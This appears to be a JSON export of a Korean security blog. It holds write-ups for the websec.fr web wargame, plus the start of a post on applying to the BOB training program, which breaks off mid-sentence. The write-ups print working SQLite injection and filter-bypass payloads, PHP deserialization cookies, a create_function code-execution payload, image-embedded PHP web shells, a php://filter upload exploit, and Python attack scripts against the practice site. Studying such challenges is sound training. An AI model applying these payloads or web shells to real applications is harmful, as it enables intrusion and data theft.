$pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125; &#125; 문제 풀이의 핵심적인 부분만 추려내서 보자. $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; 일단 쿼리문의 형태는 다음과 같다, $injection 이 부분에 입력하는 데이터가 들어가게 된다. 예를 들면 1을 입력했을 때 where id=1 limit 1과 같은 구조를 가질 것 이다. 먼저 해당 문제는 sqlite3 를 사용하는 문제이기 때문에 테이블의 구조를 union 연산자로 뽑아보자. table structure –&gt; 1 union select 1, sql from sqlite_master– - 그러면 아래와 같이 결과를 출력해줄 것 이다. id -&gt; 1 username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) 테이블 명, 컬럼 구조를 알았으니 그냥 이제 데이터 빼내오면 된다. password –&gt; 1 union select 1, password from users where id=1– - 2. LEVEL-4if (isset ($_COOKIE[&#39;leet_hax0r&#39;])) &#123; $sess_data = unserialize (base64_decode ($_COOKIE[&#39;leet_hax0r&#39;])); try &#123; if (is_array($sess_data) &amp;&amp; $sess_data[&#39;ip&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) &#123; die(&#39;CANT HACK US!!!&#39;); &#125; &#125; catch(Exception $e) &#123; echo $e; &#125; &#125; else &#123; $cookie = base64_encode (serialize (array ( &#39;ip&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;]))) ; setcookie (&#39;leet_hax0r&#39;, $cookie, time () + (86400 * 30)); &#125; if (isset ($_REQUEST[&#39;id&#39;]) &amp;&amp; is_numeric ($_REQUEST[&#39;id&#39;])) &#123; try &#123; $sql-&gt;query .= $_REQUEST[&#39;id&#39;]; &#125; catch(Exception $e) &#123; echo &#39; Invalid query&#39;; &#125; &#125; &lt;?php class SQL &#123; public $query = &#39;&#39;; public $conn; public function __construct() &#123; &#125; public function connect() &#123; $this-&gt;conn = new SQLite3 (&quot;database.db&quot;, SQLITE3_OPEN_READONLY); &#125; public function SQL_query($query) &#123; $this-&gt;query = $query; &#125; public function execute() &#123; return $this-&gt;conn-&gt;query ($this-&gt;query); &#125; public function __destruct() &#123; if (!isset ($this-&gt;conn)) &#123; $this-&gt;connect (); &#125; $ret = $this-&gt;execute (); if (false !== $ret) &#123; while (false !== ($row = $ret-&gt;fetchArray (SQLITE3_ASSOC))) &#123; echo &#39;&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; &#39; . $row[&#39;username&#39;] . &#39;&lt;/p&gt;&#39;; &#125; &#125; &#125; &#125; ?&gt; 해당 문제는 PHP Object Injection(Serialize) 문제 이다. 코드의 실행 흐름을 보면 leet_hax0r 라는 쿠키가 존재하면, $sess_data 변수에 쿠키값을 unserialize 해주고 값을 담는다. 결론은 SQL 쿼리문을 serialize -&gt; base64_encode 한 다음 쿠키 값을 바꿔주면 원하는 쿼리문을 실행시킬 수가 있다. 문제와 조건을 맞춰서 seralize화 코드를 짜서 풀었는데 아래와 같다. &lt;?php class SQL &#123; public $query = &#39;query&#39;; public $conn; &#125; $sql = new SQL; $result = serialize($sql); $encode = base64_encode($result); echo $encode; ?&gt; table structure –&gt; select id, username from users where id=1 union select 1, sql from sqlite_master– - password –&gt; select password as username from users where id=1– - 3. LEVEL-17&lt;?php include &quot;flag.php&quot;; function sleep_rand() &#123; /* I wish php5 had random_int() */ $range = 100000; $bytes = (int) (log($range, 2) / 8) + 1; do &#123; /* Side effect: more random cpu cycles wasted ;) */ $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); &#125; while ($rnd &gt;= $range); usleep($rnd); &#125; ?&gt; &lt;?php if (! strcasecmp ($_POST[&#39;flag&#39;], $flag)) echo &#39;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#39; . $flag . &#39;&lt;/mark&gt;.&lt;/div&gt;&#39;; else echo &#39;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#39;; ?&gt; 조건문만 보고 바로 strcmp 취약점이라는 것을 알 수 있었다. php loose comparison 라고도 부르는데, 참고 자료는 아래를 확인하자. 즉 $_POST[‘flag’] 부분을 배열로 넘겨주면 된다. flag[]=hi 참고(http request online) : https://reqbin.com/ 참고(php loose comparison) : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison 4. LEVEL-25&lt;?php parse_str(parse_url($_SERVER[&#39;REQUEST_URI&#39;])[&#39;query&#39;], $query); foreach ($query as $k =&gt; $v) &#123; if (stripos($v, &#39;flag&#39;) !== false) die(&#39;You are not allowed to get the flag, sorry :/&#39;); &#125; include $_GET[&#39;page&#39;] . &#39;.txt&#39;; ?&gt; parse_url 함수에서 발생하는 버그(좋버그?) 같은 개념의 문제이다.. 간단히 요약만 하면 주소에서 //를 사용하면 http://와 같은 개념이다. 그런데 /// 를 쓰면 이 함수에서는 정상적인 호스트 값이 아님을 인식하여 false를 반환시킬 수 있다. http://websec.fr///level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C 이외에도 포트를 사용한 방법, 비정상 페이로드를 입력하여 오류를 발생 시킬수도 있다. 기타 방법 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C:80 기타 방법2 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C&amp;test=1:1 5. LEVEL-28&lt;?php if(isset($_POST[&#39;submit&#39;])) &#123; if ($_FILES[&#39;flag_file&#39;][&#39;size&#39;] &gt; 4096) &#123; die(&#39;Your file is too heavy.&#39;); &#125; $filename = md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;.php&#39;; $fp = fopen($_FILES[&#39;flag_file&#39;][&#39;tmp_name&#39;], &#39;r&#39;); $flagfilecontent = fread($fp, filesize($_FILES[&#39;flag_file&#39;][&#39;tmp_name&#39;])); @fclose($fp); file_put_contents($filename, $flagfilecontent); if (md5_file($filename) === md5_file(&#39;flag.php&#39;) &amp;&amp; $_POST[&#39;checksum&#39;] == crc32($_POST[&#39;checksum&#39;])) &#123; include($filename); // it contains the `$flag` variable &#125; else &#123; $flag = &quot;Nope, $filename is not the right file, sorry.&quot;; sleep(1); // Deter bruteforce &#125; unlink($filename); &#125; ?&gt; 음 여러가지로 고민을 좀 했던 문제이다. md5, crc32를 조건을 우회해서 접근할까? 라는 생각을 잠깐 해봤었던 나는 정상이 아닌 것 같다. 암튼 본론으로 가면 해당 문제는 레이스 컨디션(race condition) 기법으로 풀이 하였다. 파일을 업로드 하고, unlink 하기전 sleep(1) 라는 1초 시간이 있어 이 기법을 활용해 서로 다른 브라우저에서 동시에 요청을 하면, 충분히 레이스 컨디션으로 서버가 unlink 하기전에 파일을 읽어올 수 있을 것 이라고 생각 하였다. 코드 풀이 추가 예정","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"websec.fr easy Write up","slug":"webseceasy-200514","date":"2020-05-13T15:00:00.000Z","updated":"2021-01-17T08:59:08.661Z","comments":true,"path":"2020/05/14/webseceasy-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/webseceasy-200514/","excerpt":"","text":"1. LEVEL 2class LevelTwo &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#39;leveltwo.db&#39;, SQLITE3_OPEN_READONLY); $searchWords = implode ([&#39;union&#39;, &#39;order&#39;, &#39;select&#39;, &#39;from&#39;, &#39;group&#39;, &#39;by&#39;], &#39;|&#39;); $injection = preg_replace (&#39;/&#39; . $searchWords . &#39;/i&#39;, &#39;&#39;, $injection); $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; $getUsers = $pdo-&gt;query ($query); $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125; &#125; 음 이전에 babystep 단계에서 풀었던 문제와 비슷한 수준입니다. 조금 달라진 것이 있다면 입력값 필터링(union, order, select) 등을 필터링 합니다. 근데 정규식(match)가 아닌 replace 방식이기 때문에 ununionion 과 같이 사용한다면 이를 우회할 수 있습니다. table structure -&gt; 1 ununionion seselectlect 1,sql frfromom sqlite_master– - password -&gt; 1 ununionion seselectlect id,password frfromom users where id=1– - 2. LEVEL 8&lt;?php $uploadedFile = sprintf(&#39;%1$s/%2$s&#39;, &#39;/uploads&#39;, sha1($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;.gif&#39;); if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125; if ($_FILES[&#39;fileToUpload&#39;][&#39;size&#39;] &lt;= 50000) &#123; if (getimagesize ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) !== false) &#123; if (exif_imagetype($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) === IMAGETYPE_GIF) &#123; move_uploaded_file ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;], $uploadedFile); echo &#39;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#39; . $uploadedFile . &#39;&quot;&gt;&#39;. htmlentities($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;&lt;/a&gt;:&lt;/p&gt;&#39;; echo &#39;&lt;pre&gt;&#39;; include_once($uploadedFile); echo &#39;&lt;/pre&gt;&#39;; unlink($uploadedFile); &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#39;; &#125; &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#39;; &#125; &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#39;; &#125; ?&gt; 파일 업로드 취약점 문제이다. gif 확장자의 사진 파일만 업로드할 수 있도록 해놨지만 사진 파일 안에 php 코드를 넣어서 웹 쉘을 사용할 수 있다. 다만 시스템 함수 사용이 안되기 때문에 scandir 함수를 통해 디렉토리 목록을 읽고 플래그 파일을 읽으면 된다. &lt;?php print_r(scandir(&quot;./&quot;)); ?&gt; &lt;?php show_source(&quot;flag.txt&quot;); ?&gt; 3. LEVEL 10&lt;?php if (isset ($_REQUEST[&#39;f&#39;]) &amp;&amp; isset ($_REQUEST[&#39;hash&#39;])) &#123; $file = $_REQUEST[&#39;f&#39;]; $request = $_REQUEST[&#39;hash&#39;]; $hash = substr (md5 ($flag . $file . $flag), 0, 8); echo &#39;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#39;; if ($request == $hash) &#123; show_source ($file); &#125; else &#123; echo &#39;Permission denied!&#39;; &#125; echo &#39;&lt;/pre&gt;&lt;/div&gt;&#39;; &#125; ?&gt; $file 변수에는 특정 파일명 를 넣고 $request 변수에는 hash 값을 입력하게 되는데, 이 입력한 hash에 대해 $request == $hash 와 같이 $hash 변수에 정의된 값이랑 비교하게 된다. 이후 두 해쉬값이 동일하면 show_source 함수를 통해 $file에 정의된 파일의 소스코드를 보여준다. 조건문을 보면 == (loose comparison) 느슨한 비교를 하고 있기 때문에 magic hash 취약점을 이용하면 풀이가 가능하다. 관련 자료는 아래 사이트를 참고하자. 자료 : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison #!/usr/bin/python import requests def run(): url = &quot;https://websec.fr/level10/index.php&quot; f = &quot;flag.php&quot; for i in range(870,1000): param = &#123;&quot;f&quot;:f, &quot;hash&quot;:0&#125; r = requests.post(url, data=param) if(&quot;Permission denied!&quot; not in r.text): print(r.text) break else: print &quot;sending payload..&quot; +str(i) f = &#39;.&#39; + &#39;/&#39; * i + &#39;flag.php&#39; if __name__ == &#39;__main__&#39;: run() 4. LEVEL 11&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); function sanitize($id, $table) &#123; /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */ if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;); &#125; /* Rock-solid too! */ $special1 = [&quot;!&quot;, &quot;\\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;-&quot;]; $special2 = [&quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;&lt;&quot;, &quot;=&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\\\&quot;, &quot;]&quot;]; $special3 = [&quot;^&quot;, &quot;_&quot;, &quot;`&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;]; $sql = [&quot;union&quot;, &quot;0&quot;, &quot;join&quot;, &quot;as&quot;]; $blacklist = array_merge ($special1, $special2, $special3, $sql); foreach ($blacklist as $value) &#123; if (stripos($table, $value) !== false) exit(&quot;Presence of &#39;&quot; . $value . &quot;&#39; detected: abort, abort, abort!\\n&quot;); &#125; &#125; if (isset ($_POST[&#39;submit&#39;]) &amp;&amp; isset ($_POST[&#39;user_id&#39;]) &amp;&amp; isset ($_POST[&#39;table&#39;])) &#123; $id = $_POST[&#39;user_id&#39;]; $table = $_POST[&#39;table&#39;]; sanitize($id, $table); $pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY); $query = &#39;SELECT id,username FROM &#39; . $table . &#39; WHERE id = &#39; . $id; //$query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); $userDetails = false; if ($users) &#123; $userDetails = $users; $userDetails[&#39;table&#39;] = htmlentities($table); &#125; &#125; ?&gt; sqlite injection 문제이다. 입력할 수 있는 부분은 user_id, table 두 가지가 있는데 user_id 부분에는 아래와 같이 is_numberic 함수로 숫자만 입력할 수 있도록 필터링 한다. if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;); &#125; 때문에 table 부분에 payload를 작성하고 데이터를 보낼 것이다. 여기서도 보고가야할 점은 union,join 이외에 여러가지 특수 문자들을 필터링 하고 있어서 as가 없어도 alias를 사용할 수 있기 때문에 이것을 우회할 수 있다. $query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id; 이제 쿼리문을 맞춰주기만 하면 되는데 코드 내에 이렇게 답을 다 주는 수준이라서 그냥 뽑아내기만 하면 된다. #!/usr/bin/python3 import requests def submit(): url = &#39;https://websec.fr/level11/index.php&#39; param = &#123;&#39;user_id&#39;:&#39;2&#39;,&#39;table&#39;:&#39;(select 2 id,enemy username from costume)&#39;,&#39;submit&#39;:&#39;submit&#39;&#125; r = requests.post(url, data=param) print r.text def main(): submit() main() 5. LEVEL 13&lt;?php // Defines $flag include &#39;flag.php&#39;; $db = new PDO(&#39;sqlite::memory:&#39;); $db-&gt;exec(&#39;CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL )&#39;); $db-&gt;prepare(&quot;INSERT INTO users VALUES(0, &#39;admin&#39;, 0, &#39;$flag&#39;);&quot;)-&gt;execute(); for($i=1; $i&lt;25; $i++) &#123; $pass = md5(uniqid()); $user = &quot;user_&quot; . substr(crc32($pass), 0, 2); $db-&gt;prepare(&quot;INSERT INTO users VALUES($i, &#39;$user&#39;, 1, &#39;$pass&#39;);&quot;)-&gt;execute(); &#125; ?&gt; &lt;?php if (isset($_GET[&#39;ids&#39;])) &#123; if ( ! is_string($_GET[&#39;ids&#39;])) &#123; die(&quot;Don&#39;t be silly.&quot;); &#125; if ( strlen($_GET[&#39;ids&#39;]) &gt; 70) &#123; die(&quot;Please don&#39;t check all the privileges at once.&quot;); &#125; $tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]); for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125; &#125; $selector = implode(&#39;,&#39;, array_unique($tmp)); $query = &quot;SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (&quot; . $selector . &quot;));&quot;; $stmt = $db-&gt;query($query); echo &#39;&lt;br&gt;&#39;; echo &#39;&lt;div class=&quot;well&quot;&gt;&#39;; echo &#39;&lt;ul&gt;&#39;; while ($row = $stmt-&gt;fetch(\\PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;li&gt;&quot;; echo &quot;User &lt;em&gt;&quot; . $row[&#39;user_name&#39;] . &quot;&lt;/em&gt;&quot;; echo &quot; with id &lt;code&gt;&quot; . $row[&#39;user_id&#39;] . &#39;&lt;/code&gt;&#39;; echo &quot; has &lt;b&gt;&quot; . ($row[&#39;user_privileges&#39;] == 0?&quot;all&quot;:&quot;no&quot;) . &quot;&lt;/b&gt; privileges.&quot;; echo &quot;&lt;/li&gt;\\n&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; echo &quot;&lt;/div&gt;&quot;; &#125; ?&gt; 문제의 코드이다. 핵심만 찾아서 한번 분석 해보자 $tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]); for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125; &#125; 이 부분을 보면 explode를 하고나서 for문을 돌리는데 여기서 $tmp 부분을 고정으로 사용하지 않고 반복문이 돌때마다 다시 저장해주고 있다. $tmp[i] &lt; 1 부분에서 1보다 작은 값이 들어가게 된다면 unset를 수행하게 되는데 이 떼 반복문에 도는 count 함수의 반환 값은 처음에 실행되었을 때의 값이랑 달라지게 된다. 그 점을 보면 정수형이 아닌 문자들이 값으로 들어오기 때문에 이 취약점을 이용해 문제를 풀이할 수 있다. #!/usr/bin/python3 import requests def submit(data): url = &quot;http://websec.fr/level13/index.php&quot; param = &#123;&#39;ids&#39;:data,&#39;submit&#39;:&#39;Go&#39;&#125; r = requests.get(url, params=param) print r.text data = &#39;0,0,0,0)) union select user_password,user_name,3 from users--&#39; submit(data) 6. LEVEL 15&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); $success = &#39; &lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; Function declared. &lt;/div&gt; &#39;; include &quot;flag.php&quot;; if (isset ($_POST[&#39;c&#39;]) &amp;&amp; !empty ($_POST[&#39;c&#39;])) &#123; $fun = create_function(&#39;$flag&#39;, $_POST[&#39;c&#39;]); print($success); //fun($flag); if (isset($_POST[&#39;q&#39;]) &amp;&amp; $_POST[&#39;q&#39;] == &#39;checked&#39;) &#123; die(); &#125; &#125; ?&gt; c라는 변수에 우리가 임의로 값을 입력할 수 있다. 입력한 값이 create_function 함수를 거쳐 $fun 변수에 저장되고, 이후 $success 함수에 정의된 내용을 출력해준다. 취약점 관련해서 자료를 찾아 보다가 RCE 취약점이 있음을 알 수 있었다. 관련 자료는 해당 포스팅이 끝나고 별도로 업로드 할 예정이니 아래 링크를 참고하자. 함수를 만들어 줄때 보면 $_POST[‘c’] 와 같이 두번째 인자를 임의로 조작할 수 있다. 이 부분을 이용해서 RCE 취약점을 발생시켜 플래그를 얻을 수 있다. return% -1;} show_source(“flag.php”); /* 참고 : https://blog.jhyeon.xyz/category/docx/function_rce/ 8. LEVEL 20&lt;?php include &quot;flag.php&quot;; class Flag &#123; public function __destruct() &#123; global $flag; echo $flag; &#125; &#125; function sanitize($data) &#123; /* i0n1c&#39;s bypass won&#39;t save you this time! (https://www.exploit-db.com/exploits/22547/) */ if ( ! preg_match (&#39;/[A-Z]:/&#39;, $data)) &#123; return unserialize ($data); &#125; if ( ! preg_match (&#39;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#39;, $data )) &#123; return unserialize ($data); &#125; return false; &#125; $data = Array(); if (isset ($_COOKIE[&#39;data&#39;])) &#123; $data = sanitize (base64_decode ($_COOKIE[&#39;data&#39;])); &#125; if (isset ($_POST[&#39;value&#39;]) and ! empty ($_POST[&#39;value&#39;])) &#123; /* Add a value twice to remove it from the list. */ if (($key = array_search ($_POST[&#39;value&#39;], $data)) !== false) &#123; unset ($data[$key]); &#125; else &#123; /* Else, simply add it. */ array_push ($data, $_POST[&#39;value&#39;]); &#125; setcookie (&#39;data&#39;, base64_encode (serialize ($data))); &#125; ?&gt; PHP Object Injection 문제가 다시 돌아왔다. 소스코드를 분석해보면 일단 data 라는 쿠키에 serialize 된 값을 넣어주는 것으로 보아 class Flag 객체를 serialize 해서 넣어주면 된다. 그런데 data 값에 O:4:’Flag’ 이런식으로 넣어주는 데 이 구문이 필터링되서 사용을 못한다. exploit-db 사이트를 주면서 O:+15 이런식의 bypass도 봤는데 이것도 사용이 안된다. 그래서 삽질을 좀 해본 결과로,, 아래 블로그를 찾아서 해결할 수 있었는데 https://www.evonide.com/fuzzing-unserialize/ case C의 경우와 O의 경우에 같은 분기로 넘어가게 된다. 여기서 그러면 C:4:’Flag’ 이런식으로 써줄 수 있지 않을까 하고 테스트 해보니 잘 작동된다. 아래 구문을 serialize -&gt; base64 encode 방식을 써서 쿠키값을 넣어면 플래그를 준다. serialize : C:4:’Flag’:0:{} serialize(base64) -&gt; Qzo0OuKAmUZsYWfigJk6MDp7fQ== 9. LEVEL 22&lt;?php class A &#123; public $pub; protected $pro ; private $pri; function __construct($pub, $pro, $pri) &#123; $this-&gt;pub = $pub; $this-&gt;pro = $pro; $this-&gt;pri = $pri; &#125; &#125; include &#39;file_containing_the_flag_parts.php&#39;; $a = new A($f1, $f2, $f3); unset($f1); unset($f2); unset($f3); $funcs_internal = get_defined_functions()[&#39;internal&#39;]; /* lets allow some secure funcs here */ unset ($funcs_internal[array_search(&#39;strlen&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;print&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;strcmp&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;strncmp&#39;, $funcs_internal)]); $funcs_extra = array (&#39;eval&#39;, &#39;include&#39;, &#39;require&#39;, &#39;function&#39;); $funny_chars = array (&#39;\\.&#39;, &#39;\\+&#39;, &#39;-&#39;, &#39;&quot;&#39;, &#39;;&#39;, &#39;`&#39;, &#39;\\[&#39;, &#39;\\]&#39;); $variables = array (&#39;_GET&#39;, &#39;_POST&#39;, &#39;_COOKIE&#39;, &#39;_REQUEST&#39;, &#39;_SERVER&#39;, &#39;_FILES&#39;, &#39;_ENV&#39;, &#39;HTTP_ENV_VARS&#39;, &#39;_SESSION&#39;, &#39;GLOBALS&#39;); $blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables); $insecure = false; foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#39;/&#39; . $blacklisted . &#39;/im&#39;, $code)) &#123; $insecure = true; break; &#125; &#125; if ($insecure) &#123; echo &#39;Insecure code detected!&#39;; &#125; else &#123; eval (&quot;echo $code;&quot;); &#125; ?&gt; 먼저 $code 변수에는 임의로 값을 넣어 eval($code) 형식으로 실행 시킬 수 있다. php sandbox형 문제인데, 처음에 생각한 방법이 $blacklist에 정의된 배열을 뽑아내서 플래그를 볼려고 했다. 근데 길이 제한이 21자 이기 때문에 페이로드가 길어지면 사용이 불가능하다. (심지어 플래그 파일명이 졸라 길다) 하지만 또 이상한 부분이 있다. a 객체를 만들어주고 unset 해주는 부분을 볼 수 있는데, 이 객체를 사용해서 var_dump로 출력을 찍어내서 보면 플래그가 있다. 위 과정들을 손수 하기에는 아~주 귀찮아서 파이썬으로 짜서 풀었다. 배열 내에서 var_dump() 함수 찾는게 좀 노가다 인데.. 그냥 좀 기다리면 된다. #!/usr/bin/python3 import requests def read(): for i in range(1,1000): blacklist = &#39;$blacklist&#123;&#39;+str(i)+&#39;&#125;($a)&#39; url = &#39;https://websec.fr/level22/index.php&#39; param = &#123;&#39;code&#39;:blacklist, &#39;submit&#39;:&#39;a&#39;&#125; r = requests.get(url, params=param) if &quot;WEBSEC&quot; in r.text: print r.text break else: print &quot;sending payload&quot;+blacklist read() 10. LEVEL 24&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); session_start(); include &#39;clean_up.php&#39;; /* periodic cleanup */ foreach (glob(&quot;./uploads/*&quot;) as $file) &#123; if (is_file($file)) &#123; unlink($file); &#125; else &#123; if (time() - filemtime($file) &gt;= 60 * 60 * 24 * 7) &#123; Delete($file); &#125; &#125; &#125; $upload_dir = sprintf(&quot;./uploads/%s/&quot;, session_id()); @mkdir($upload_dir, 0755, true); /* sandboxing ! */ chdir($upload_dir); ini_set(&#39;open_basedir&#39;, &#39;.&#39;); $p = &quot;list&quot;; $data = &quot;&quot;; $filename = &quot;&quot;; if (isset($_GET[&#39;p&#39;]) &amp;&amp; isset($_GET[&#39;filename&#39;]) ) &#123; $filename = $_GET[&#39;filename&#39;]; if ($_GET[&#39;p&#39;] === &quot;edit&quot;) &#123; $p = &quot;edit&quot;; if (isset($_POST[&#39;data&#39;])) &#123; $data = $_POST[&#39;data&#39;]; if (strpos($data, &#39;&lt;?&#39;) === false &amp;&amp; stripos($data, &#39;script&#39;) === false) &#123; # no interpretable code please. file_put_contents($_GET[&#39;filename&#39;], $data); die (&#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#39;); &#125; &#125; elseif (file_exists($_GET[&#39;filename&#39;]))&#123; $data = file_get_contents($_GET[&#39;filename&#39;]); &#125; &#125; &#125; ?&gt; 파일 업로드 문제이다. 웹 쉘을 업로드 해서 간단히 문제를 해결할 수 있지만, 파일 내용에 &lt;? 이 못들어가도록 php 코드 실행을 허술(?) 하게 막고 있다. 이는 php wrapper인 base64 en/decode 방식을 사용하면 된다. #!/usr/bin/python3 #import requests import requests import base64 filename = &#39;shell.php&#39; def session(sess): url = sess.get(&#39;https://websec.fr/level24/index.php&#39;) session_key = url.cookies.get_dict()[&#39;PHPSESSID&#39;] return session_key def shell(): return &quot;&lt;?php echo file_get_contents(&#39;../../flag.php&#39;); ?&gt;&quot;.encode(&#39;base64&#39;) def exploit(sess): payload = &#39;php://filter/convert.base64-decode/resource=&#39;+filename url = &#39;https://websec.fr/level24/index.php?p=edit&amp;filename=&#39;+payload data = &#123;&#39;filename&#39;: payload, &#39;data&#39;: shell()&#125; req = sess.post(url, data=data) def execute(sess, session_key): url = &#39;https://websec.fr/level24/uploads/&#39;+session_key+&#39;/&#39;+filename r = sess.get(url) print url print r.text def main(): sess = requests.Session() session_key = session(sess) exploit(sess) execute(sess, session_key) main() 세션값이 실행 시마다 변경되기 때문에 같은 방법으로 실행 때 마다 새 세션을 구해줘야 하는데, 이 부분에서 세션키를 얻는 과정이 갑자기 생각안나서 한 2시간 잡고있었던 것 같다.. 풀면서 느낀거지만, 파이썬 언어 연습좀 더 해야겠다.","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"BOB 8기 서류 & 면접 후기","slug":"bob8th-200510","date":"2020-05-09T15:00:00.000Z","updated":"2021-01-17T09:09:56.418Z","comments":true,"path":"2020/05/10/bob8th-200510/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/10/bob8th-200510/","excerpt":"","text":"올해도 bob 9기 교육생 모집이 시작되었습니다..!! 이번에도 기회가 주어진 만큼 열심히 준비하고 꼭 붙고 싶은 마음 뿐입니다..! 9기 이전에 저는 8기 때도 bob에 교육생으로 지원하게 되었습니다. 체계적인 교육 과정과 프로젝트 등.. 제가 생각하는 bob는 기대 그 이상으로 좋은 프로그램이라고 생각하고 있습니다. 지금도 그렇구요 먼저 서류에 대해서 약간 후기를 남겨봅니다. 자기소개서 본인이 이룬 성과 및 사례 지원동기 합격후 포부 관심 분야 학업 계휙 진로 계휙 전반적으로 위 7가지 항목에 대해서 내가 어떤 사람이고, 보안에 어떻게 관심을 가졌는지, 지금까지 어떤 활동을 해왔는지 등에 대해서 상세적으로 풀어서 작성하였습니다.. 정확히 어떤 내용을 작성해야 하는지는 이제 본인이 직접 하나씩 트리를 정리해보면서 작성해보시는 것을 권유드립니다. 일단 서류도 보면 경쟁률이 어마어마 하기 때문에 절대! 모든 항목에 대해 소홀히 쓰시면 안되고 어필할 수 있는 것을 모두 짧고 굵게 어필 해야 한다고 생각이 듭니다 ㅎㅎ.. 앗! 또한 서류 작성하실 때 거짓된 내용, 자기가 한것처럼 꾸미는 내용, 아는척(?) 에 대해서 글을 쓰시면 안됩니다. 멘토님들이 서류를 하나하나 모두 검토하시기 때문에 서류는 붙을 수 있어도 면접에서 